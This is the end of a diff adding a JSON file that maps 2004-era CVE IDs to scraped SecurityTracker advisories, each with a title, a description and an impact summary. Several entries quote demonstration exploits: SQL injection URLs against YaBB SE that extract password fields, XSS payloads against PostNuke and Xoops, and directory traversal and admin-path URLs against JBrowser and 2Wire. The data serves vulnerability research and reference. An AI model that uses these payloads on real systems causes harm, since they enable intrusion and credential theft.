+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2748": [
+      {
+        "url": "http://www.securitytracker.com/id?1008799",
+        "title": "WebTrends Reporting Center Discloses Installation Path to Remote Users",
+        "body": "A vulnerability was reported in WebTrends Reporting Center. A remote user can determine the installation path.Oliver Karow reported that a remote user can invoke the 'viewreport.pl' script and supply a 'profileid' value that does not exist to cause the target server to display the installation path.A demonstration exploit URL is provided:http://[target]:1099/viewreport.pl?profileid=dontexistAn exploit screen shot is available at:http://www.oliverkarow.de/research/WT.jpgThe vendor was reportedly notified on January 5, 2004.",
+        "extra": "A remote user can determine the installation path.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2749": [
+      {
+        "url": "http://securitytracker.com/id?1008798",
+        "title": "2Wire Gatway Input Validation Flaw Permits Cross-Site Scripting Attacks",
+        "body": "An input validation vulnerability was reported in the 2Wire Gateway. A remote user can conduct cross-site scripting attacks against administrators.Rafel Ivgi (The-Insider) reported that a remote user can modify the SSL-based authentication web form's action parameter to cause commands or scripting code to be executed when the form is loaded.A demonstration action value is provided:http://[target]/wra/public/wralogin/?error=61&return=password/../../../../boot.iniIt appears that a remote user can create a specially crafted form that, when loaded by a target administrator, will cause arbitrary scripting code to be executed by the target administrator's browser. The code will originate from the 2Wire Gateway device and will run in the security context of that site. As a result, the code may be able to access the target administrator's cookies (including authentication cookies), if any, associated with the device, access data recently submitted by the target administrator via web form to the device, or take actions on the device acting as the target administrator.",
+        "extra": "A remote user may be able to access the target administrator's cookies (including authentication cookies), if any, associated with the device, access data recently submitted by the target administrator via web form to the device, or take actions on the device acting as the target administrator.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2750": [
+      {
+        "url": "http://securitytracker.com/id?1008909",
+        "title": "JBrowser Discloses Files on the System to Remote Users",
+        "body": "Two vulnerabilities were reported in JBrowser. A remote user can view arbitrary files with the privileges of the web service. A remote user can also access admin scripts in the default configuration.Himeur Nourredine reported that the 'browser.php' script does not validate user-supplied input in the 'directory' variable. A remote user can supply a specially crafted URL to view specified files on the target system that are located outside of the intended directory.A demonstration exploit URL is provided:http://[target]/browser.php?directory=[ATTACKER_SPECIFIED_PATH]It is also reported that the default installation does not restrict access to the '_admin' directory. A remote user can reportedly execute scripts in this directory. A remote user may be able to upload arbitrary files to the target system or access to files on the target system.Some demonstration exploit URLs are provided:http://[target]/_admin/http://[target]/_admin/list_all.php?folder=../http://[target]/_admin/upload.php",
+        "extra": "A remote user can view specified files on the target system with the privileges of the target web service.A remote user can access certain administrative scripts.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2751": [
+      {
+        "url": "http://securitytracker.com/id?1008629",
+        "title": "PostNuke Input Validation Flaw in 'sortby' Variable in 'members_list' Module Permits SQL Injection",
+        "body": "An input validation vulnerability was reported in PostNuke. A remote user can inject SQL commands. A remote user can also conduct cross-site scripting attacks.JeiAr of the GulfTech Security Research Team reported that the 'members_list' module does not properly validate user-supplied input in the 'sortby' variable. A remote user may be able to execute SQL commands on the underlying database.It is also reported that the download module does not filter HTML code from user supplied input in the 'ttitle' variable. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the PostNuke software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. A demonstration exploit is provided (where '[VID]' is a valid file ID number):name=Downloads&file=index&req=viewdownloaddetails&lid=[VID]&ttitle=\"><iframe>",
+        "extra": "A remote user can inject SQL commands on the target system.A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the PostNuke software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2752": [
+      {
+        "url": "http://securitytracker.com/id?1008629",
+        "title": "PostNuke Input Validation Flaw in 'sortby' Variable in 'members_list' Module Permits SQL Injection",
+        "body": "An input validation vulnerability was reported in PostNuke. A remote user can inject SQL commands. A remote user can also conduct cross-site scripting attacks.JeiAr of the GulfTech Security Research Team reported that the 'members_list' module does not properly validate user-supplied input in the 'sortby' variable. A remote user may be able to execute SQL commands on the underlying database.It is also reported that the download module does not filter HTML code from user supplied input in the 'ttitle' variable. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the PostNuke software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. A demonstration exploit is provided (where '[VID]' is a valid file ID number):name=Downloads&file=index&req=viewdownloaddetails&lid=[VID]&ttitle=\"><iframe>",
+        "extra": "A remote user can inject SQL commands on the target system.A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the PostNuke software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2754": [
+      {
+        "url": "http://www.securitytracker.com/id?1008764",
+        "title": "YaBB SE 'SSI.php' Input Validation Flaw Permits SQL Injection",
+        "body": "An input validation vulnerability was reported in YaBB SE in 'SSI.php'. A remote user can inject SQL commands.It is reported that that the ID_MEMEBER parameter is not properly validated by the 'recentTopics' and 'welcome' functions. A remote user can supply a specially crafted URL to execute SQL commands on the underlying database. Some demonstration exploit URLs are provided:http://[target]/yabbse/SSI.php?function=recentTopics&ID_MEMBER=1+OR+1=2)+LEFT+JOIN+yabbse_log_mark_read+AS+lmr+ON+(lmr.ID_BOARD=t.ID_BOARD+AND+lmr.ID_MEN+SELECT+ID_MEMBER,+memberName,null,passwd,null,passwd,null,null,null,null,null,null+FROM+yabbse_members+/*http://[target]/yabbse/SSI.php?function=recentTopics&ID_MEMBER=1+OR+1=1)+LEFT+JOIN+yabbse_log_mark_read+AS+lmr+ON+(lmr.ID_BOARD=t.ID_BOARD+AND+lmr.ID_MEull,null+FROM+yabbse_members+/*http://[target]/yabbse/SSI.php?function=welcome&username=evilhaxor&ID_MEMBER=1+OR+1=2)+GROUP+BY+readBy+UNION+SELECT+ASCII(SUBSTRING(realName,1,1)+)+Some demonstration exploit code is available in the Source Message.",
+        "extra": "A remote user can execute arbitrary SQL commands on the underlying database. This can be exploited to view hashed passwords, for example.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2755": [
+      {
+        "url": "http://www.securitytracker.com/alerts/2004/Jan/1008711.html",
+        "title": "Symantec Web Security Blocked Page Message Lets Remote Users Conduct Cross-Site Scripting Attacks",
+        "body": "An input validation vulnerability was reported in Symantec Web Security. A remote user can conduct cross-site scripting attacks.It is reported that when Symantec Web Security blocks a particular URL, a page displays the blocked URL but does not filter HTML code from the URL. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will run in the security context of the blocked site. As a result, the code may be able to access the target user's cookies (including authentication cookies), if any, associated with unblocked portions of the site, access data recently submitted by the target user via web form to the unblocked portions of the site, or take actions on the unblocked portions of the site acting as the target user. The vendor credits Oliver.Karow and Brian Soby of Raytheon with separately and independently reporting this vulnerability.[Editor's note: A similar vulnerability was reported in Norton Internet Security in October 2003, as described in Alert ID 1008010.]",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with a blocked site, access data recently submitted by the target user via web form to the unblocked portions of the site, or take actions on the unblocked portions of the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2756": [
+      {
+        "url": "http://securitytracker.com/id?1008849",
+        "title": "Xoops Input Validation Flaw in 'newbb' Module Permits Cross-Site Scripting Attacks",
+        "body": "Ben Drysdale reported an input validation vulnerability in Xoops in the 'newbb' module. A remote user can conduct cross-site scripting attacks.It is reported that the newbb module does not properly filter HTML code from user-supplied input in the 'forum' and 'topic_id' variables of 'viewtopic.php'. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Xoops software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. Some demonstration exploit URLs are provided:http://[target]/modules/newbb/viewtopic.php?topic_id=14577&forum=2\"><script>alert(document.cookie);</script> http://[target]/modules/newbb/viewtopic.php?topic_id=14577\"><script>alert(document.cookie);</script>&forum=2",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Xoopos software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2761": [
+      {
+        "url": "http://securitytracker.com/id?1024697",
+        "title": "Red Hat Certificate System Bugs Let Remote Users Obtain One-Time PINs and Generate Certificates",
+        "body": "Several vulnerabilities were reported in Red Hat Certificate System. A remote user can obtain one-time PINs in certain situations. A remote user can generate signed text. A remote user can generate certificates.A remote user can conduct an MD5 chosen-prefix collision attack to generate attack-chosen SCEP protocol output signed using the certificate authority's key [CVE-2004-2761].A remote user can request a one-time PIN in an SCEP request to be decrypted by the certificate authority [CVE-2010-3868].A remote user with a valid SCEP enrollment one-time PIN can re-use the PIN to generate an unlimited number of certificates [CVE-2010-3869].",
+        "extra": "A remote user can obtain one-time PINs in certain situations.A remote user can generate signed text output.A remote user can generate certificates.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2764": [
+      {
+        "url": "http://securitytracker.com/id?1011661",
+        "title": "Sun JRE XSLT Processor Error Lets Remote Applets Gain Elevated Privileges",
+        "body": "A vulnerability was reported in the XSLT processor in Sun's Java Runtime Environment (JRE). An applet can obtain elevated privileges.In August 2004, Sun reported that the JRE XSLT processor allows a remote untrusted applet to read data from another applet that is being processed using the XSLT processor. The untrusted applet may be able to obtain elevated privileges.Sun credits Marc Schoenefeld with reporting this flaw.",
+        "extra": "An untrusted applet may be able to obtain elevated privileges.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ]
+  }
+}
